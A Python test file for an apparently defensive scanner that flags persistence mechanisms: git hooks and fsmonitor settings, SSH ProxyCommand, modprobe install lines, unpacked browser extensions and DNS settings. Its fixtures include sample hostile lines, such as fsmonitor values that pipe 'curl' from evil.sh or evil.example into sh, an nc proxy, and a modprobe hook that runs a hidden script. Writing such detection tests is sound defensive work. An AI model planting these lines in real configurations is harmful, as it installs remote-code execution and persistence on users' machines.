# Run: python3 tests/test_persistence.py (or pytest)
import atexit, os, shutil, sys, tempfile
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from arche.persistence import hooks, chromium_roots, chromium_extensions, install_cmds, git_runs, dns_rows


def test_hooks():
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    os.environ.update(HOME=home, GIT_CONFIG_NOSYSTEM='1')
    try:
        with open(f'{home}/.gitconfig', 'w') as f:
            f.write('[core]\n\tfsmonitor = "curl evil.sh | sh"\n[alias]\n\tlg = log --oneline\n\tx = !rm -rf /tmp/x\n')
        os.makedirs(f'{home}/.ssh'); open(f'{home}/.ssh/config', 'w').write('Host *\n  ProxyCommand nc -x evil:1080 %h %p\n  User me\n')
        rows = [r[0] for r in hooks() if home in r[0] or r[0].startswith('git global')]
    finally: os.environ.clear(); os.environ.update(old)
    assert any('core.fsmonitor' in r for r in rows) and any('alias.x' in r for r in rows), rows
    assert not any('alias.lg' in r or 'User me' in r for r in rows) and any('ProxyCommand nc' in r for r in rows), rows



def test_custom_chromium_dirs():
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    for d in ('.config/brave-vault/Default', '.config/Code', '.var/app/x.y/config/work/Profile 2'): os.makedirs(f'{home}/{d}')
    for f in ('.config/brave-vault/Local State', '.config/brave-vault/Default/Preferences', '.config/Code/Local State',
              '.config/Code/Preferences', '.var/app/x.y/config/work/Local State', '.var/app/x.y/config/work/Profile 2/Preferences'):
        open(f'{home}/{f}', 'w').write('{}')
    os.environ['HOME'] = home
    try: extra = [(n, r.replace(home, '~')) for n, r in chromium_roots() if r.startswith(home)]
    finally: os.environ.clear(); os.environ.update(old)
    assert extra == [('brave-vault', '~/.config/brave-vault'), ('work', '~/.var/app/x.y/config/work')], extra   # not the Electron app



def test_unpacked_extensions():
    import json
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    prof, dev = f'{home}/.config/google-chrome/Default', f'{home}/.cache/.x'
    for d in (f'{prof}/Extensions/aaaa/1.0', dev): os.makedirs(d)
    open(f'{home}/.config/google-chrome/Local State', 'w').write('{}'); open(f'{prof}/Preferences', 'w').write('{}')
    open(f'{prof}/Extensions/aaaa/1.0/manifest.json', 'w').write('{"name": "Store one"}')
    open(f'{dev}/manifest.json', 'w').write('{"name": "Helper", "host_permissions": ["<all_urls>"]}')
    open(f'{prof}/Secure Preferences', 'w').write(json.dumps({'extensions': {'settings': {
        'bbbb': {'location': 4, 'path': dev}, 'cccc': {'location': 1, 'path': dev}, 'dddd': {'location': 8, 'path': f'{home}/gone'}}}}))
    import arche.persistence as p
    os.environ['HOME'], real = home, p.HOME; p.HOME = home
    try: got = sorted((t, e) for n, t, e, _ in chromium_extensions() if n == 'Chrome')
    finally: os.environ.clear(); os.environ.update(old); p.HOME = real
    assert got == [('Helper', 'bbbb'), ('Store one', 'aaaa')], got


def test_install_cmds():
    t = ('install usb-storage /bin/true\ninstall cramfs /bin/false\ninstall dccp exit 1\n# install x /tmp/evil\n'
         'install snd-pcm /sbin/modprobe --ignore-install snd-pcm && /sbin/modprobe snd-seq\n'
         'install e1000e /tmp/.x/run.sh; /sbin/modprobe --ignore-install e1000e\nblacklist nouveau\n')
    assert list(install_cmds(t)) == [('e1000e', '/tmp/.x/run.sh; /sbin/modprobe --ignore-install e1000e')], list(install_cmds(t))


def test_git_runs():
    l = ('core.fsmonitor=true\ncore.fsmonitor=.git/hooks/fsmonitor-watchman\nfilter.lfs.smudge=git-lfs smudge -- %f\n'
         'filter.x.smudge=./x.sh\ndiff.pdf.textconv=pdftotext\nalias.st=status\nalias.y=!sh y\nremote.origin.url=https://x\n')
    assert [k for k, _ in git_runs(l)] == ['core.fsmonitor', 'filter.x.smudge', 'diff.pdf.textconv', 'alias.y']


def test_repo_git_folder():
    import arche.ai
    r, old = tempfile.mkdtemp(), arche.ai.repos; atexit.register(shutil.rmtree, r, True)
    os.makedirs(f'{r}/.git/hooks')
    open(f'{r}/.git/config', 'w').write('[core]\n\tfsmonitor = "curl -s https://evil.example/x | sh"\n\tsshCommand = ssh -i ~/.ssh/deploy\n')
    open(f'{r}/.git/hooks/post-checkout', 'w').write('#!/bin/sh\necho hi\n'); os.chmod(f'{r}/.git/hooks/post-checkout', 0o755)
    open(f'{r}/.git/hooks/pre-commit.sample', 'w').write('#!/bin/sh\n'); os.chmod(f'{r}/.git/hooks/pre-commit.sample', 0o755)
    arche.ai.repos = lambda: [r]
    try: rows = [(t, s) for t, s, _ in hooks() if r in t]
    finally: arche.ai.repos = old
    assert [s for _, s in rows] == [1, 0, 0] and 'evil.example' in rows[0][0] and 'post-checkout' in rows[2][0], rows


def test_dns_rows():
    g = 'Global\n         Protocols: LLMNR=resolve -mDNS {} DNSSEC=no\n  resolv.conf mode: {}\n\nLink 2 (eno1)\n    Protocols: +DefaultRoute -mDNS\n                    {}\n'
    t = lambda *a: [r[0].split(':')[0] for r in dns_rows(g.format(*a))]
    assert t('-DNSOverTLS', 'foreign', '-DNSOverTLS') == ['DNS lookups skip systemd-resolved (/etc/resolv.conf names the servers itself), so they go out unencrypted']
    assert t('-DNSOverTLS', 'stub', '-DNSOverTLS') == ['DNS lookups go out unencrypted']
    assert t('-DNSOverTLS', 'stub', 'DNSOverTLS=opportunistic') == ['DNS over TLS']
    assert t('+DNSOverTLS', 'stub', '-DNSOverTLS') == ['DNS over TLS'] and list(dns_rows('')) == []


if __name__ == '__main__':
    test_hooks(); test_dns_rows(); test_git_runs(); test_repo_git_folder(); test_custom_chromium_dirs(); test_unpacked_extensions(); test_install_cmds(); print('ok')
